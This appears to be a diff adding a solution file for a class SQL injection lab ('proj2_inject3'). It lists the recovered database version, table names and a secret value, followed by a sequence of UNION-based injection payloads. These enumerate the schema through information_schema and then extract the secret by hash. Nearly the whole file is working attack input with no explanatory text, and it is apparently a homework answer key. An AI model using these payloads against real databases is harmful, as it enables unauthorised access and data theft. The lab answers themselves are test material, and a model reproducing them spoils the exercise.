@@ -1,0 +1,18 @@
+proj2_inject3
+5.5.59-0ubuntu0.14.04.1
+HINT, SECRET, foo, inject3_users
+parietal
+
+' union select 1, version(), 1, 1;#
+' union select 1, database(), 1, 1;#
+' union select 1, 1, 1, table_name FROM information_schema.tables where table_schema='proj2_inject3' limit 1 offset 0;#
+' union select 1, 1, 1, table_name FROM information_schema.tables where table_schema='proj2_inject3' limit 1 offset 1;#
+' union select 1, 1, 1, table_name FROM information_schema.tables where table_schema='proj2_inject3' limit 1 offset 2;#
+' union select 1, 1, 1, table_name FROM information_schema.tables where table_schema='proj2_inject3' limit 1 offset 3;#
+' union select 1, 1, 1, table_name FROM information_schema.tables where table_schema='proj2_inject3' limit 1 offset 4;#
+' union select 1, 1, 1, column_name from information_schema.columns where table_name='SECRET' limit 1 offset 0;#
+' union select 1, 1, 1, column_name from information_schema.columns where table_name='SECRET' limit 1 offset 1;#
+' union select 1, 1, 1, column_name from information_schema.columns where table_name='SECRET' limit 1 offset 2;#
+' union select 1, 1, 1, column_name from information_schema.columns where table_name='SECRET' limit 1 offset 3;#
+' union select 1, 1, 1, column_name from information_schema.columns where table_name='SECRET' limit 1 offset 4;#
+' union select 1, 1, 1, secret from SECRET where hash='399b307328aa61ac59af8b66d18b8645';#
